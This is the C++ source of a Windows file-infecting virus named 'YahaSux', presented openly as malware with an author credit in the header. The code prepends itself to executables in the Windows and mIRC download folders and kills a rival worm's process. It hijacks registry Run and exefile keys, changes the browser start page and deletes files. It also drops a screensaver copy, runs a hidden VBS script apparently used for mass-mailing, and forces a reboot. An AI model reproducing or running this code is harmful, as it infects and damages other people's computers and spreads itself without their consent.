/*
		Virus Name: YahaSux
		Version: B
		Type: Win32 EXE Prepender
		Author: Gigabyte [Metaphase]
		Homepage: http://coderz.net/gigabyte
*/


#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include "yahasux.h"

#define VIRUSSIZE 32

using namespace std;

char VirCheck(char SRCFileName[])
{
	FILE *SRC;
	char Buffer[1];
	int v=0;
	SRC=fopen(SRCFileName,"rb");

	if(SRC)
	{
		fseek(SRC,19,0);
		fread(Buffer,1,1,SRC);
	}

	fclose(SRC);
	return Buffer[0];
}

void WriteVirus(char SRCFileName[],char DSTFileName[])
{
	FILE *SRC, *DST;
	char Buffer[1024];
	short Counter=0;
	int v = 0;
	SRC=fopen(SRCFileName, "rb");
	if(SRC)
	{
		DST = fopen(DSTFileName, "wb");
		if(DST)
		{
			for (v=0;v < VIRUSSIZE;v++)
			{
				Counter = fread(Buffer, 1, 1024, SRC);
				if(Counter)
					fwrite(Buffer, 1, Counter, DST);
			}
		}
	}
	fclose(SRC);
	fclose(DST);
}

void AddOrig(char SRCFileName[],char DSTFileName[])
{
	FILE *SRC,*DST;
	char Buffer[1024];
	short Counter=0;
	SRC=fopen(SRCFileName,"rb");
	if(SRC)
	{
		DST=fopen(DSTFileName,"ab");
		if(DST)
		{
			while(!feof(SRC))
			{
				Counter=fread(Buffer,1,1024,SRC);
				if(Counter)
				fwrite(Buffer,1,Counter,DST);
			}
		}
	}
	fclose(SRC);
	fclose(DST);
}

void InfectFile(char hostfile[],char virus[])
{
	CopyFile(hostfile,"yahasux.exe",FALSE);
	WriteVirus(virus,hostfile);
	AddOrig("yahasux.exe",hostfile);
}

void CopyOrig(char SRCFileName[], char DSTFileName[])
{
	FILE *SRC,*DST;
	char Buffer[1024];
	short Counter=0;
	int v=0;
	SRC=fopen(SRCFileName,"rb");
	if(SRC)
	{
		DST=fopen(DSTFileName,"wb");
		if(DST)
		{
			fseek(SRC,(VIRUSSIZE*1024),0);

			while(!feof(SRC))
			{
				Counter=fread(Buffer,1,1024,SRC);
				if(Counter)
				fwrite(Buffer,1,Counter,DST);
			}
		}
	}
	fclose(SRC);
	fclose(DST);
}

bool FileExists(char *FileName)
{
	HANDLE Exists;
	Exists=CreateFile(FileName,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,0,OPEN_EXISTING,0,0);
	if(Exists==INVALID_HANDLE_VALUE)
	return false;
	CloseHandle(Exists);
	return true;
}

int KillWinServices ()
{
	HANDLE PrListHandle,PrHandle;
	PROCESSENTRY32 processList;
	int counter = 0;

	PrListHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	while (true)
	{
		if (counter == 0)
		{ 
			if (Process32First(PrListHandle, &processList) == FALSE && GetLastError()==ERROR_NO_MORE_FILES)
			{
				CloseHandle(PrListHandle); 
				return false;
			}
		}
		else
		{
			if (Process32Next(PrListHandle, &processList) == FALSE) 
			{
				if (GetLastError() != ERROR_NO_MORE_FILES)
				{
					CloseHandle(PrListHandle);
					return false;
				}
				else
				{
					CloseHandle(PrListHandle);
					break;
				}
			}
		}

		if (strstr(processList.szExeFile,"WinServices.exe")||strstr(processList.szExeFile,"WINSER~1.EXE"))
		{
			PrHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processList.th32ProcessID);
			if (!TerminateProcess(PrHandle, NULL))
				return false;
			else
				return true;
			CloseHandle(PrHandle);
		}
		counter++;
	}
	return false;
}

void main(int argc, char **argv)
{
	struct HKEY__* reghandle;
	char sysdir[50],windir[40],MyDocsPath[MAX_PATH],winstartpath[70];
	DWORD MyDocsLength=MAX_PATH;
	WIN32_FIND_DATA FileData;
	HANDLE SearchHandle,hToken;
	FILE* MailFile;
	const unsigned char startpage[]="http://127.0.0.1";
	TOKEN_PRIVILEGES tkp;
	OSVERSIONINFO winver;

	winver.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	GetVersionEx(&winver);

	GetSystemDirectory(sysdir,50);
	SetCurrentDirectory(sysdir);

	if(FileExists("nav32_loader.exe")&&!(FileExists("c:\\MathMagic.scr")))
	{
		WriteVirus(argv[0],"winstart.exe");
		strcpy(winstartpath,sysdir);
		strcat(winstartpath,"\\winstart.exe");

		if(KillWinServices())
		{
			RegSetValue(HKEY_LOCAL_MACHINE,"Software\\Classes\\exefile\\shell\\open\\command",REG_SZ,"\"%1\" %*",7);
			RegSetValue(HKEY_CLASSES_ROOT,"exefile\\shell\\open\\command",REG_SZ,"\"%1\" %*",7);
			RegSetValue(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",REG_SZ,winstartpath,strlen(winstartpath));

			RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",&reghandle);
			RegQueryValueEx(reghandle,"Personal",NULL,NULL,(BYTE*)MyDocsPath,&MyDocsLength);
			RegCloseKey(reghandle);

			RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&reghandle);
			RegDeleteValue(reghandle,"WinServices");
			RegCloseKey(reghandle);

			DeleteFile("WinServices.exe");
			DeleteFile("nav32_loader.exe");
			DeleteFile("hotmail_hack.exe");
			DeleteFile("friendship.scr ");
			DeleteFile("world_of_friendship.scr ");
			DeleteFile("shake.scr");
			DeleteFile("Sweet.scr");
			DeleteFile("Be_Happy.scr ");
			DeleteFile("Friend_Finder.exe");
			DeleteFile("I_Like_You.scr");
			DeleteFile("love.scr");
			DeleteFile("dance.scr");
			DeleteFile("GC_Messenger.exe");
			DeleteFile("True_Love.scr");
			DeleteFile("Friend_Happy.scr");
			DeleteFile("Best_Friend.scr");
			DeleteFile("life.scr");
			DeleteFile("colour_of_life.scr");
			DeleteFile("friendship_funny.scr");
			DeleteFile("funny.scr");
	
			SetCurrentDirectory(MyDocsPath);
			SearchHandle=FindFirstFile("*.*",&FileData);
			SetFileAttributes(FileData.cFileName,FILE_ATTRIBUTE_NORMAL);
	
			while(FindNextFile(SearchHandle,&FileData))
			SetFileAttributes(FileData.cFileName,FILE_ATTRIBUTE_NORMAL);
		}
	}


	if(strstr(argv[0],"winstart.exe"))
	{
		DeleteFile("tcpsvs32.exe");
		MessageBox(NULL,"Hi there.. it seems you were infected with Yaha.k. That worm however, written by an idiot who sPeLlS lIkE tHiS, abused my website and got me to receive the complaints. Therefore, I have just disinfected you. Don't worry tho.. as I didn't wanna steal from you, I gave you this virus (Win32.HLLP.YahaSux) in return :)\n\nGreetz,\n\nGigabyte [Metaphase VX Team]","Exchange viruses?",MB_OK|MB_ICONINFORMATION);
	}

	if(FileExists("c:\\progra~1\\mirc\\mirc.exe"))
	{
		SetCurrentDirectory("c:\\progra~1\\mirc\\download");
		SearchHandle=FindFirstFile("*.exe",&FileData);
		if(SearchHandle!=INVALID_HANDLE_VALUE)
		{
			if(VirCheck(FileData.cFileName)!='g')
				InfectFile(FileData.cFileName,argv[0]);

			while(FindNextFile(SearchHandle,&FileData))
			{
				if(VirCheck(FileData.cFileName)!='g')
						InfectFile(FileData.cFileName,argv[0]);
			}

			DeleteFile("yahasux.exe");
		}
	}

	RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main",&reghandle);
	RegSetValueEx(reghandle,"Start Page",0,REG_SZ,startpage,16);

	GetWindowsDirectory(windir,40);
	SetCurrentDirectory(windir);

	if(winver.dwPlatformId==VER_PLATFORM_WIN32_NT)
	{
		SearchHandle=FindFirstFile("*.exe",&FileData);
		if(VirCheck(FileData.cFileName)!='g')
			InfectFile(FileData.cFileName,argv[0]);
	
		while(FindNextFile(SearchHandle,&FileData))
		{
			if(strcmp(FileData.cFileName,"explorer.exe")&&VirCheck(FileData.cFileName)!='g'&&strcmp(FileData.cFileName,"yahasux.exe"))
				InfectFile(FileData.cFileName,argv[0]);	
		}

		DeleteFile("yahasux.exe");
	}

	if(!(FileExists("c:\\MathMagic.scr")))
	{
		WriteVirus(argv[0],"c:\\MathMagic.scr");
		fwrite(MailData,2346,1,MailFile=fopen("yahasux.vbs","wb"));
		fclose(MailFile);
		ShellExecute(NULL,"open","yahasux.vbs",NULL,NULL,SW_HIDE);

		if(winver.dwPlatformId==VER_PLATFORM_WIN32_NT)
		{
			OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken); 
			LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid); 
			tkp.PrivilegeCount=1;  
			tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED; 
			AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES)NULL,0);
		}

		Sleep(40000);
		ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0);
	}

	if(!(strstr(argv[0],"winstart.exe")||strstr(argv[0],"MathMagic.scr")||strstr(argv[0],"yahasux.exe")))
	{
		CopyOrig(argv[0],"screwyaha.exe");
		WinExec("screwyaha.exe",SW_SHOWNORMAL);
		while(!DeleteFile("screwyaha.exe")){}
	}
}